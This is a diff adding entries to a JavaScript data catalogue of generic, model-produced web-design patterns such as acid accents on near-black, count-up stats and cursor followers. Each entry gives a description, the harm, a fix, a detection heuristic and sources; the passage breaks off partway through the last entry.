@@ -10413,8 +10413,9894 @@ const DATA=[
   "added": "2026-10-06",
   "updated": "2026-10-06",
   "detect": "judgement"
+ },
+ {
+  "id": "acid-accent-on-near-black",
+  "name": "Acid Accent On Near-Black",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Colour",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "A near-black page with one bright acid-green or vermilion accent, the default 'bold' alternative to purple.",
+  "looksLike": "Background #0B0B0B or #111 rather than a chosen dark. Buttons, links and one highlighted word in lime, acid green or vermilion. Everything else is grey text, often with a faint glow on the accent.",
+  "why": "It is the second stock answer models give when steered off indigo gradients. Anthropic's frontend-design skill lists it as a calibration cluster, along with tinted near-blacks standing in for black.",
+  "who": "Brands look like a crypto or dev-tool launch whatever they sell, and the single loud colour fights every other signal on the page.",
+  "theFix": "Derive the palette from the subject: name four to six colours with a reason each. If a dark page is right, choose its ground and accent deliberately and check accent contrast for text use.",
+  "heur": "Flag a body background with lightness under 8% plus one high-chroma accent hue near 90 to 130 or 10 to 30 degrees used on CTAs and highlights.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "skills/skills/frontend-design/SKILL.md at main · anthropics/skills",
+    "u": "https://github.com/anthropics/skills/blob/main/skills/frontend-design/SKILL.md"
+   },
+   {
+    "t": "How to Keep Your Website From Looking Like Every Other Vibe Coded Website",
+    "u": "https://codemyspec.com/blog/vibe-coded-websites-look-the-same"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   }
+  ],
+  "code": "A94",
+  "rel": [
+   "reflex-cream",
+   "permanent-midnight",
+   "the-untouched-component-theme"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "broadsheet-cosplay",
+  "name": "Broadsheet Cosplay",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Layout",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Hairline rules everywhere, zero border radius and dense newspaper columns, worn as the 'editorial' look.",
+  "looksLike": "Every section is boxed or divided by 1px lines. Corners are perfectly square, text sits in tight multi-column grids, and labels read like a masthead. It looks like a newspaper front page selling a SaaS tool.",
+  "why": "When users steered models away from purple gradients, the published remedy was 'make it editorial', and models adopted the whole kit. Anthropic's skill names the broadsheet layout as one of five clusters AI design now falls into.",
+  "who": "Products lose their own character, and dense ruled grids make long pages tiring to scan on a phone.",
+  "theFix": "Build structure from space and tone rather than lines. Use rules only where they separate data, and tell the tool not to default to an editorial or newspaper style unless the brief asks.",
+  "heur": "Count 1px borders and hr elements per screen; flag 3 or more ruled boxes alongside border-radius 0 on most containers.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "skills/skills/frontend-design/SKILL.md at main · anthropics/skills",
+    "u": "https://github.com/anthropics/skills/blob/main/skills/frontend-design/SKILL.md"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   },
+   {
+    "t": "How to Keep Your Website From Looking Like Every Other Vibe Coded Website",
+    "u": "https://codemyspec.com/blog/vibe-coded-websites-look-the-same"
+   }
+  ],
+  "code": "A95",
+  "rel": [
+   "lopsided-opening-columns",
+   "three-identical-feature-cards",
+   "centred-hero-one-button"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "count-up-stats",
+  "name": "Count-Up Stats",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "Stat numbers that spin up from zero when scrolled into view, making invented figures feel measured.",
+  "looksLike": "'0+' ticks up to '10,000+' as the stat row enters the screen. The digits jitter in width as they change, and screenshots taken early show zeros.",
+  "why": "Magic UI's Number Ticker packages the effect, its MCP server lets coding assistants add it by name, and comparison guides list animated counters among the library's staples. Animation lends the numbers a sense of being live, even when they are hardcoded.",
+  "who": "Visitors read decoration as data, and people who scroll fast or use reduced motion may see wrong values or zeros.",
+  "theFix": "Show the final number, with its source and date. If you animate, start from the real value, use tabular figures and skip it under reduced motion.",
+  "heur": "Flag number elements whose text changes on intersection, and check for font-variant-numeric: tabular-nums on them.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Number Ticker | React Components & Templates",
+    "u": "https://magicui.design/docs/components/number-ticker"
+   },
+   {
+    "t": "Magic UI MCP Server | React Components & Templates",
+    "u": "https://magicui.design/docs/mcp"
+   },
+   {
+    "t": "Aceternity UI vs Magic UI vs shadcn/ui 2026 — PkgPulse Guides",
+    "u": "https://www.pkgpulse.com/guides/aceternity-ui-vs-magic-ui-vs-shadcn-animated-react-2026"
+   },
+   {
+    "t": "font-variant-numeric CSS property - CSS | MDN",
+    "u": "https://developer.mozilla.org/en-US/docs/Web/CSS/font-variant-numeric"
+   }
+  ],
+  "code": "A96",
+  "rel": [
+   "the-pulsing-dot",
+   "the-endless-marquee",
+   "bounce-easing-in-the-interface"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "cursor-spotlight-cards",
+  "name": "Cursor Spotlight Cards",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "A soft radial glow that follows the mouse across every card and lights up its border.",
+  "looksLike": "Move the pointer over the feature grid and a circle of light tracks it, revealing a gradient border. On touch screens nothing happens, and the cards look flat and unfinished.",
+  "why": "Spotlight cards are packaged components in Magic UI (Magic Card) and Aceternity (Card Spotlight, Glowing Effect). One comparison guide notes the same spotlight effects appear across dozens of different products, and detector catalogues track the --mouse-x / --mouse-y pattern.",
+  "who": "Touch and keyboard users never see the effect the design relies on, and mouse users get decoration where content should be.",
+  "theFix": "Give cards a visible resting state that does not depend on hover. Drop the cursor-tracked glow, or limit it to one interactive surface.",
+  "heur": "Flag pointermove listeners setting --mouse-x / --mouse-y or radial-gradient positions on 3 or more cards.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Magic Card | React Components & Templates",
+    "u": "https://magicui.design/docs/components/magic-card"
+   },
+   {
+    "t": "Card Spotlight | Aceternity UI",
+    "u": "https://ui.aceternity.com/components/card-spotlight"
+   },
+   {
+    "t": "Aceternity UI vs Magic UI vs shadcn/ui 2026 — PkgPulse Guides",
+    "u": "https://www.pkgpulse.com/guides/aceternity-ui-vs-magic-ui-vs-shadcn-animated-react-2026"
+   },
+   {
+    "t": "slop-detect pattern catalogue API (version 2026.11)",
+    "u": "https://slop-detect.com/api/patterns"
+   }
+  ],
+  "code": "A97",
+  "rel": [
+   "the-tilt-card",
+   "light-running-round-the-border",
+   "the-cursor-follower"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "default-easing-everywhere",
+  "name": "Default Easing Everywhere",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "Every transition on the site runs the framework default: transition-all, 150 to 300ms, the same stock curve.",
+  "looksLike": "Buttons, cards, links, menus and modals all change with the same speed and feel. Hover a card and padding, shadow, colour and size animate together because transition-all catches everything.",
+  "why": "Tailwind's transition utilities default to cubic-bezier(0.4, 0, 0.2, 1) at 150ms, and models write 'transition-all duration-300' on nearly every element. Taste-skill's study counts that curve in 38 stylesheets as a framework default, not a chosen one.",
+  "who": "Interfaces feel generic and slightly mushy, and transition-all can animate layout properties that cause jank.",
+  "theFix": "Define a few motion tokens by job (press, hover, menu, reveal) and transition only the properties that change, such as opacity, colour and transform.",
+  "heur": "Count transition-all usages and transitions with the default curve; flag when they cover most interactive elements.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "transition-property - Transitions & Animation - Tailwind CSS",
+    "u": "https://tailwindcss.com/docs/transition-property"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/motion.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/motion.md"
+   }
+  ],
+  "code": "A98",
+  "rel": [
+   "fade-up-on-everything",
+   "bounce-easing-in-the-interface",
+   "cursor-spotlight-cards"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "default-neobrutalism",
+  "name": "Default Neobrutalism",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Colour",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Thick black borders, hard offset shadows and sticker badges as the 'playful' default look.",
+  "looksLike": "Cards and buttons with 2 to 4px black outlines and solid black shadows offset down and right. Flat saturated fills, tilted sticker badges, and chunky sans headings. It shows up on finance, health and B2B tools alike.",
+  "why": "Impeccable's 2026 examples show 'GPT-style neobrutalism: bold borders, hard shadows, sticker badges' as one era of model defaults. When asked for something bold or fun, models apply the whole kit rather than a single idea.",
+  "who": "Serious products look like toys, and the heavy outlines crowd dense information.",
+  "theFix": "If the brand is playful, find the play in the subject rather than the border. Tell the tool not to use offset hard shadows or sticker badges unless the brief asks.",
+  "heur": "Flag box-shadow with zero blur and a positive offset in black, combined with borders of 2px or more, on 3 or more components.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Slop | Impeccable",
+    "u": "https://impeccable.style/slop"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/imagery.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/imagery.md"
+   }
+  ],
+  "code": "A99",
+  "rel": [
+   "acid-accent-on-near-black",
+   "permanent-midnight",
+   "neon-glow-on-everything"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "design-tool-chrome-as-ornament",
+  "name": "Design-Tool Chrome As Ornament",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Crosshairs, crop marks, selection handles and dashed guides drawn on a finished page as decoration.",
+  "looksLike": "A hero image with little corner brackets, a headline wrapped in a dashed box with square handles like a Figma selection, ruler ticks along the edge. The page dresses up as a design file.",
+  "why": "It is a gallery fashion that generators copy because it reads as 'made by designers'. Taste-skill bans it as one of the first ornaments generators lift from award sites.",
+  "who": "Visitors see what looks like an unfinished or still-selected layout, and the clutter carries no information.",
+  "theFix": "Remove the guides and handles. If the product is a design tool, show its real interface instead of borrowing its chrome.",
+  "heur": "Flag dashed borders, small absolutely positioned corner squares or crosshair SVGs around headings and images on non-design-tool pages.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   }
+  ],
+  "code": "A100",
+  "rel": [
+   "the-fake-browser-frame",
+   "meteor-shower-backdrop",
+   "headshot-drift"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "furniture-text",
+  "name": "Furniture Text",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Decorative strings like 'Est. 2024 · Austin · v2.1' and a live local clock that say nothing.",
+  "looksLike": "Small text strips of words joined by middle dots or slashes. Coordinates, local time, weather, version stamps, '(Scroll to explore)' and '©2026 Scroll' scattered at the corners of the hero.",
+  "why": "Agency portfolio sites popularised this micro-meta, and models now add it to any page as instant sophistication. Anthropic's skill names meta strings joined with middle dots as template chrome, and taste-skill's linter flags these strings directly.",
+  "who": "Readers spend attention on noise, and screen reader users hear a string of fragments before the content.",
+  "theFix": "Delete it. Keep only facts a visitor needs, such as an address or opening hours, written as normal sentences at readable size.",
+  "heur": "Regex visible text for 3 or more short tokens joined by ' · ' or ' / ', clock patterns, coordinates or 'Scroll' labels outside nav and footer.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "skills/skills/frontend-design/SKILL.md at main · anthropics/skills",
+    "u": "https://github.com/anthropics/skills/blob/main/skills/frontend-design/SKILL.md"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/copy.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/copy.md"
+   }
+  ],
+  "code": "A101",
+  "rel": [
+   "leftover-lorem",
+   "the-any-company-paragraph",
+   "the-weightless-headline"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "light-running-round-the-border",
+  "name": "Light Running Round The Border",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "A beam or shimmer of light that loops around the edge of buttons, cards and text, forever.",
+  "looksLike": "The primary button has a glint travelling round its perimeter. Feature cards have a coloured beam chasing their border. The hero badge has a light sweep panning across its text every two seconds.",
+  "why": "Component libraries built for AI-assisted IDEs ship these as one-line installs: Magic UI's Shimmer Button, Border Beam, Shine Border and Animated Shiny Text, and Aceternity's Moving Border. Magic UI's MCP server lets the coding assistant add them on request.",
+  "who": "People with attention or vestibular sensitivities get constant motion in their peripheral vision, and every element competes for the eye.",
+  "theFix": "Remove decorative loops. If one element must move, run it once and stop, and respect prefers-reduced-motion.",
+  "heur": "Flag infinite CSS animations on borders, conic or linear gradients and background-position on buttons, cards or badges.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Shimmer Button | React Components & Templates",
+    "u": "https://magicui.design/docs/components/shimmer-button"
+   },
+   {
+    "t": "Border Beam | React Components & Templates",
+    "u": "https://magicui.design/docs/components/border-beam"
+   },
+   {
+    "t": "Moving Border Animation for React & Tailwind | Aceternity UI",
+    "u": "https://ui.aceternity.com/components/moving-border"
+   },
+   {
+    "t": "Magic UI MCP Server | React Components & Templates",
+    "u": "https://magicui.design/docs/mcp"
+   },
+   {
+    "t": "Understanding Success Criterion 2.2.2: Pause, Stop, Hide | WAI | W3C",
+    "u": "https://www.w3.org/WAI/WCAG22/Understanding/pause-stop-hide.html"
+   }
+  ],
+  "code": "A102",
+  "rel": [
+   "cursor-spotlight-cards",
+   "bounce-on-hover",
+   "the-endless-marquee"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "meteor-shower-backdrop",
+  "name": "Meteor Shower Backdrop",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Animated meteors, light beams or sparkle particles streaming behind the hero to make a dark page feel 'alive'.",
+  "looksLike": "Thin diagonal streaks fall across the hero on a loop, or SVG beams sweep behind the headline, or tiny particles twinkle around it. The effect has nothing to do with the product.",
+  "why": "Meteors, Background Beams and Sparkles are ready-made hero backgrounds in Aceternity UI and Magic UI, and Magic UI's MCP server lets coding assistants install its effects by name. They fill the empty space behind a centred hero without needing an image.",
+  "who": "Moving backgrounds behind text reduce readability and drain battery, and they cannot be paused.",
+  "theFix": "Use a still background or a real picture of the product. If motion is needed, make it stoppable and honour reduced-motion settings.",
+  "heur": "Flag absolutely positioned background layers with infinite animations (meteor, beam, sparkle, particles) behind heading text.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Meteor Effect | Aceternity UI",
+    "u": "https://ui.aceternity.com/components/meteors"
+   },
+   {
+    "t": "Background Beams Animation for React | Aceternity UI",
+    "u": "https://ui.aceternity.com/components/background-beams"
+   },
+   {
+    "t": "Meteors | React Components & Templates",
+    "u": "https://magicui.design/docs/components/meteors"
+   },
+   {
+    "t": "Magic UI MCP Server | React Components & Templates",
+    "u": "https://magicui.design/docs/mcp"
+   },
+   {
+    "t": "Understanding Success Criterion 2.2.2: Pause, Stop, Hide | WAI | W3C",
+    "u": "https://www.w3.org/WAI/WCAG22/Understanding/pause-stop-hide.html"
+   }
+  ],
+  "code": "A103",
+  "rel": [
+   "the-dimmed-hero-photo",
+   "the-integration-constellation",
+   "floating-3d-nothing"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "monospace-as-costume",
+  "name": "Monospace As Costume",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Typography",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "A monospace face used for labels, captions and even headings to make a non-technical page feel technical.",
+  "looksLike": "Small grey captions, eyebrows, prices and dates set in JetBrains Mono or Geist Mono. Sometimes the H2 itself is monospace on a bakery or consulting site. Nothing on the page is code.",
+  "why": "Award galleries made monospace micro-labels fashionable, and generators copy gallery devices first. Anthropic's frontend-design skill lists 'a monospace face for small data labels' among the template chrome that appears whatever the subject.",
+  "who": "Readers get harder-to-scan labels and a tone that has nothing to do with the product.",
+  "theFix": "Use the text face for labels and tabular figures for numbers. Keep monospace for code, keys and real data that must align.",
+  "heur": "Flag monospace font-family on elements that are not code, kbd, samp or pre, especially headings at 24px or more.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "skills/skills/frontend-design/SKILL.md at main · anthropics/skills",
+    "u": "https://github.com/anthropics/skills/blob/main/skills/frontend-design/SKILL.md"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   },
+   {
+    "t": "slop-detect pattern catalogue API (version 2026.11)",
+    "u": "https://slop-detect.com/api/patterns"
+   }
+  ],
+  "code": "A104",
+  "rel": [
+   "serif-as-the-premium-shortcut",
+   "inter-for-everything",
+   "the-italic-serif-wink"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "same-section-different-words",
+  "name": "Same Section, Different Words",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Layout",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Every section uses the same template: centred heading, one-line subhead, then a grid of cards.",
+  "looksLike": "Features, benefits, use cases, testimonials and integrations all look identical apart from the words. Scroll down and the page repeats one block shape six times.",
+  "why": "Models build each section by filling the same component pattern, because it worked once in the prompt and is the most common shape in training data. Impeccable calls it 'copy-paste layouts', and taste-skill flags every section using the same layout family.",
+  "who": "Readers stop seeing the differences between sections and miss the one that matters.",
+  "theFix": "Ask the tool to choose a different composition for each section based on its content: a list, a single image, a table, a quote. Cut sections that have nothing distinct to say.",
+  "heur": "Compare the DOM structure of top-level sections; flag 3 or more with the same heading-plus-grid signature.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Slop | Impeccable",
+    "u": "https://impeccable.style/slop"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   },
+   {
+    "t": "slop-detect pattern catalogue API (version 2026.11)",
+    "u": "https://slop-detect.com/api/patterns"
+   }
+  ],
+  "code": "A105",
+  "rel": [
+   "centred-hero-one-button",
+   "blueprint-grid-wallpaper",
+   "three-identical-feature-cards"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "scrambled-headline-reveal",
+  "name": "Scrambled Headline Reveal",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "The headline arrives as scrambled characters or word by word, so it is unreadable for the first seconds.",
+  "looksLike": "Letters flicker through random glyphs before settling, or each word fades in one at a time. The call to action waits until the text finishes. Reloading replays the whole effect.",
+  "why": "Hyper Text (Magic UI) and Text Generate Effect (Aceternity) are packaged for AI coding tools, and a text animation is an easy way to make a page feel 'AI'. Taste-skill's study found scramble and typewriter headlines left text unreadable for up to four seconds.",
+  "who": "Everyone waits to read the one sentence that explains the product, and screen readers may read gibberish.",
+  "theFix": "Render real words on the first frame. If you want an entrance, keep it short and leave the text readable throughout.",
+  "heur": "Flag headings whose text content differs from the final value at load, or per-character spans with staggered delays over 1 second in total.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Hyper Text | React Components & Templates",
+    "u": "https://magicui.design/docs/components/hyper-text"
+   },
+   {
+    "t": "Text Generate Effect | Aceternity UI",
+    "u": "https://ui.aceternity.com/components/text-generate-effect"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/motion.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/motion.md"
+   }
+  ],
+  "code": "A106",
+  "rel": [
+   "the-rotating-headline-word",
+   "fade-up-on-everything",
+   "cursor-on-a-page-you-cant-type-in"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "serif-as-the-premium-shortcut",
+  "name": "Serif As The Premium Shortcut",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Typography",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "An oversized, often italic serif headline used by default to make any product look 'premium' or 'editorial'.",
+  "looksLike": "A huge high-contrast serif or italic serif headline, 'Beautifully Crafted', on a cream or near-black page, with a plain sans for everything else. It appears on fintech, wellness and dev tools alike.",
+  "why": "Models learned that serif display type is the fastest signal of taste and reach for it when asked for something less generic. Impeccable lists the italic serif display headline as a familiar shortcut, and Anthropic's skill names the high-contrast serif display as part of an AI cluster.",
+  "who": "Brands borrow a luxury voice that may not fit them, and the look is now common enough to read as generated.",
+  "theFix": "Choose the display face for the product's character and reading needs. If a serif is right, say why in the brief and set it at a size the content needs.",
+  "heur": "Flag h1 with a serif or italic computed font-style at 64px or more when the body is sans and the brand guide does not specify it.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Slop | Impeccable",
+    "u": "https://impeccable.style/slop"
+   },
+   {
+    "t": "skills/skills/frontend-design/SKILL.md at main · anthropics/skills",
+    "u": "https://github.com/anthropics/skills/blob/main/skills/frontend-design/SKILL.md"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   }
+  ],
+  "code": "A107",
+  "rel": [
+   "the-italic-serif-wink",
+   "wide-tracked-body",
+   "monospace-as-costume"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "stickers-on-the-hero",
+  "name": "Stickers On The Hero",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Layout",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Little floating cards, chips and badges stuck on top of the hero image: '+24% conversions', 'Live', '4.9 rating'.",
+  "looksLike": "A product photo or screenshot with two or three small white cards hovering over its corners, each with an icon, a number and a label. They overlap the image and sometimes each other, and none links anywhere.",
+  "why": "Models fill hero media with callouts to make it feel busy and data-rich. OpenAI's own GPT-5.4 frontend guide tells the model not to place detached labels, floating badges, promo stickers, info chips or callout boxes on hero media, which shows how often it does.",
+  "who": "Visitors get decorative claims instead of a clear picture, and on phones the stickers cover the product.",
+  "theFix": "Let the hero image be one clear picture. Move any real facts into the supporting sentence below, with a source.",
+  "heur": "Flag absolutely positioned card or badge elements overlapping the hero image bounding box.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Designing delightful frontends with GPT-5.4 | OpenAI Developers",
+    "u": "https://developers.openai.com/blog/designing-delightful-frontends-with-gpt-5-4"
+   },
+   {
+    "t": "OpenAI publishes a prompting playbook that helps designers get better frontend results from GPT-5.4",
+    "u": "https://the-decoder.com/openai-publishes-a-prompting-playbook-that-helps-designers-get-better-frontend-results-from-gpt-5-4/"
+   }
+  ],
+  "code": "A108",
+  "rel": [
+   "lopsided-opening-columns",
+   "three-identical-feature-cards",
+   "centred-hero-one-button"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-avatar-stack",
+  "name": "The Avatar Stack",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Trust",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "Five overlapping face circles and 'Join 2,000+ happy users' under the hero button, with no one real behind them.",
+  "looksLike": "A row of small round avatars overlapping like coins, often with a '+99' bubble at the end, next to five yellow stars and a round number. The faces are stock or generated.",
+  "why": "Avatar Circles is a packaged Magic UI component, and the block is a standard landing-page shape models fill with flattering defaults. Taste-skill lists star rows and invented counts as invented social proof.",
+  "who": "Visitors are shown a community that may not exist, which damages trust when they notice.",
+  "theFix": "Remove it until you have real users who agreed to appear. Show one real quote with a name and link instead.",
+  "heur": "Flag 3 or more overlapping round images with negative margins next to a number plus 'users', 'customers' or 'founders'.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Avatar Circles | React Components & Templates",
+    "u": "https://magicui.design/docs/components/avatar-circles"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   }
+  ],
+  "code": "A109",
+  "rel": [
+   "the-dimmed-hero-photo",
+   "floating-3d-nothing",
+   "meteor-shower-backdrop"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-avoidance-aesthetic",
+  "name": "The Avoidance Aesthetic",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Layout",
+  "harm": "Credibility",
+  "origin": "Prompting",
+  "oneLiner": "Every known AI tell removed and nothing put in its place: a polite, empty page anyone could predict.",
+  "looksLike": "No gradients, no glow, no cards, no emoji. Instead, a quiet neutral page with a modest headline, plain sections and no idea. It passes every slop checklist and still says nothing about the product.",
+  "why": "Anti-slop prompts and skills are lists of bans, and a model following them optimises for what to leave out. Taste-skill calls the result the 'avoidance aesthetic', and notes that steering models off one cluster tends to land them in another.",
+  "who": "Founders who used an anti-slop prompt think the design problem is solved, while visitors still see a generic page.",
+  "theFix": "Start from the subject: give the tool one concrete idea only this product could own, real pictures or a committed type choice, and run the checks after that.",
+  "heur": "Human review: could the page belong to any competitor after swapping the logo? If yes, it has no idea, however clean it is.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   },
+   {
+    "t": "How to Keep Your Website From Looking Like Every Other Vibe Coded Website",
+    "u": "https://codemyspec.com/blog/vibe-coded-websites-look-the-same"
+   }
+  ],
+  "code": "A110",
+  "rel": [
+   "the-conveyor-belt-page",
+   "centred-hero-one-button",
+   "lopsided-opening-columns"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-cursor-follower",
+  "name": "The Cursor Follower",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "The system cursor is hidden or chased by a custom dot, ring or label that lags behind the mouse.",
+  "looksLike": "A circle trails the pointer with springy delay, grows over links and shows 'View' or 'Drag'. Sometimes the real cursor is hidden altogether, so clicks feel slightly off.",
+  "why": "Smooth Cursor and Pointer (Magic UI) and Following Pointer (Aceternity) are one-line installs, and AI tools add them when asked for something 'premium'. Taste-skill found custom cursors on 28 of 99 studied sites, only 10 with any reduced-motion rule.",
+  "who": "People with motor or low-vision needs lose the cursor they rely on, and laggy pointers make precise clicking harder.",
+  "theFix": "Keep the system cursor. Put labels like 'View' on the page next to the thing they describe.",
+  "heur": "Flag cursor: none on body or large containers, or a fixed element moved by mousemove listeners.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Smooth Cursor | React Components & Templates",
+    "u": "https://magicui.design/docs/components/smooth-cursor"
+   },
+   {
+    "t": "Following Pointer | Aceternity UI",
+    "u": "https://ui.aceternity.com/components/following-pointer"
+   },
+   {
